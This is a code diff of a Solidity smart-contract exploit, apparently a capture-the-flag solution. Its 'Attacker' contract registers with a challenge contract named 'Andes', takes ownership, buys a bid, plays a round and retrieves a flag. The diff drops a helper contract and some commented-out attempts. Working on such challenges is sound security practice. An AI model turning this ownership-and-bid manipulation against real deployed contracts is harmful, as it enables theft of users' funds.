@@ -101,41 +101,27 @@ contract Andes {
     }
 }
 
-contract Bounce {
-    Attacker attacker;
-
-    constructor(address _attacker) {
-        attacker = Attacker(_attacker);
-    }
-
-    function designateOwner() public {}
-}
-
 contract Attacker {
     Andes andes;
-    Bounce bounce;
-    address owner;
 
+    // debug event
     event Balance(uint256);
 
-    constructor(
-        address _andes /*, address _bounce */
-    ) {
+    constructor(address _andes) {
         andes = Andes(_andes);
         andes.register();
         andes.designateOwner();
-        andes.setNextSelector(msg.sender);
-
-        // bounce = Bounce(_bounce);
-        // bounce.designateOwner();
     }
 
-    function attack(bytes32 token) public {
-        // andes.setNextNumber(17);
-        andes.purchaseBid(8);
+    function attack(uint8 bid) public {
+        andes.purchaseBid(bid);
         andes.playRound();
-        emit Balance(andes.getBalance());
 
+        // debug log the current balance
+        emit Balance(andes.getBalance());
+    }
+
+    function getFlag(bytes32 token) public {
         andes.getFlag(token);
     }
 }
